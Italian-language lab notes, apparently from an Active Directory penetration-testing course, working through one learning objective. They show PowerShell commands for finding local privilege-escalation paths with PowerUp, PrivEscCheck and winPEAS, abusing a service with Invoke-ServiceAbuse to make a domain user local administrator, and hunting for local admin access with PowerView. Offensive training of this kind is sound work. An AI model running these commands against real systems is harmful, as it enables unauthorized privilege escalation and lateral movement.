# LEARNING OBJECTIVE5

<figure><img src="../.gitbook/assets/Schermata da 2025-11-26 14-43-31.png" alt=""><figcaption></figcaption></figure>

1. Exploita un servizio su dcorp-studentx e eleva i privliegi ad amminstratore locale
2. Identifica un host nel dominio dove lo studentex ha accesso amministrativo locale
3. Utilizzando i privilegi dell'utente del servizio Jenkins su 172.16.3.11:8080, ottenere i privilegi su 172.16.3.11, il dcorp-ci server

#### 1.Exploit servizio su studentVM (dcorp-std178)

```powershell
. C:\AD\Tools\PowerUp.ps1 (Importiamo PowerUp)
Invoke-AllChecks (Eseguiamo la funzion che esegue check per LPE)
```

<figure><img src="../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>

Alternativamente si puo' usare PrivEscCheck

```powershell
. C:\AD\Tools\PrivEscCheck.ps1
Invoke-PrivEscCheck
```

<figure><img src="../.gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>

Anche winPeas64.exe

```powershell
./wimPEAS64.exe
```

<figure><img src="../.gitbook/assets/Schermata da 2025-12-18 12-15-36.png" alt=""><figcaption></figcaption></figure>

Infine per exploitare il servizio, eseguiamo

```powershell
Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName dcorp\student178
```

<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

#### 2.Ricerca Accesso Amministrativo Locale per student178

```powershell
 . C:\AD\Tools\PowerView.ps1
 Find-LocalAdminAccess -Verbose
```

<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

Alternativamente si possono usare&#x20;

```powershell
 . C:\AD\Tools\Find-WMILocalAdminAccess.ps1
  Find-WMILocalAdminAccess
```



L'utente ha accesso amministrativo su&#x20;

<kbd>dcorp-adminsrv.dollarcorp.moneycorp.local</kbd>
